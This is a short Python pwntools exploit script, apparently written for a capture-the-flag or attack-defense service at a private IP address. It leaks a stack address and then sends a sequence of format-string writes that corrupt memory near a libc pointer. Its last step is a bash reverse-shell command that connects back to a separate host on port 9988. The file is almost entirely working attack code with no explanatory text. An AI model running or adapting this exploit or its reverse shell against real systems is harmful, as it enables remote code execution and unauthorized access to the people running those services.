#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "200.200.200.106"
port = 44444

r = remote(host,port)
r.recvuntil("Reference Stack Pointer is ")
stack = int(r.recvuntil("\n")[:-1],16)
print "stack:",hex(stack)
libcbyte_addr = stack + 0x18 + 2
r.recvuntil("ee?")
r.sendline(str(libcbyte_addr))
r.recvuntil("-->")
r.recvuntil("The value is ")
value = int(r.recvuntil("\n")[:-1],16)
one_value = value 

r.recvuntil("-->")
r.sendline(fmtchar(0,one_value+59,1))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr))

r.recvuntil("-->")
r.sendline(fmtchar(0,0x2b,1))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-1))

r.recvuntil("-->")
r.sendline(fmtchar(0,0x10,1))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-2))

r.recvuntil("-->")
r.sendline(fmtchar(0,0x6a,9))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-1))

r.recvuntil("-->")
r.sendline(fmtchar(0,0x11,1))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-2))

r.recvuntil("-->")
r.sendline(fmtchar(0,0x42,9))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-1))

r.recvuntil("-->")
r.sendline(fmtchar(0,0x12,1))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-2))

r.recvuntil("-->")
r.sendline(fmtchar(0,one_value+3,9))
r.recvuntil("-->")
r.sendline(str(libcbyte_addr-1))

r.recvuntil("-->")
r.sendline("%100000s")
r.recvuntil("-->")
r.sendline(str(libcbyte_addr))

for i in range(6):
    r.recvuntil("-->")
    r.sendline("1")
    r.recvuntil("-->")
    r.sendline(str(libcbyte_addr))


rever = "bash -c 'bash>&/dev/tcp/10.1.13.217/9988 0>&1'"
r.sendline(rever)
r.interactive()
